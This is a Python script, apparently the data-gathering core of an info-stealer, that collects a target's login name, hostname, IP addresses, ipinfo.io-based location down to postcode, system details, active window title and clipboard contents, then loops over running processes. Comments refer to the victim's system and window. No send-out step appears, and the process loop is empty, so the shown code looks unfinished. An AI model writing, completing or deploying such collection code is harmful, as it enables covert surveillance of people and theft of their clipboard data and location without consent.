import win32gui, requests, pyperclip, platform, socket, psutil, os

class main:
    def __init__(self):
        self.LoginName = os.getlogin() # Login Name
        self.CurrentDirectory = os.curdir # Current Directory
        self.SocketHostName = socket.gethostname() # Desktop Name
        self.SocketIP = socket.gethostbyaddr(self.SocketHostName)[2] # IPV6 As An Array
        self.SocketIPV6 = str(self.SocketIP).replace("[", "").replace("]", "") # IPV6 Converted To A String
        self.IPInfoRequest = requests.get("http://ipinfo.io/json").json() # Request To Info Site
        self.IPV4 = self.IPInfoRequest['ip'] # IPV4
        self.City = self.IPInfoRequest['city'] # City
        self.Region = self.IPInfoRequest['region'] # Region
        self.Country = self.IPInfoRequest['country']# Country
        self.PostCode = self.IPInfoRequest['postal'] # PostCode
        self.GoogleMaps = requests.get(f"https://www.google.com/maps/search/google+map++{self.IPInfoRequest['loc']}") # Google Maps Request
        self.System = str(platform.uname()).split("=")[1].split(",")[0]# Their System
        self.Version = str(platform.uname()).split(",")[3].split("=")[1] # Their System Version
        self.Machine = str(platform.uname()).split(",")[4].split("=")[1] # Their Machine
        self.Processor = str(platform.uname()).split(",")[5].split("=")[1].replace("'", "") # Their Processor
        self.CurrentWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow()) # Their Current Window
        self.ClipBoard = pyperclip.paste() # Gets Clipboard Contents
        for process in psutil.process_iter(): # Iterates Over Every File They Have Running Currently
            pass
        
if __name__ == "__main__":
    main()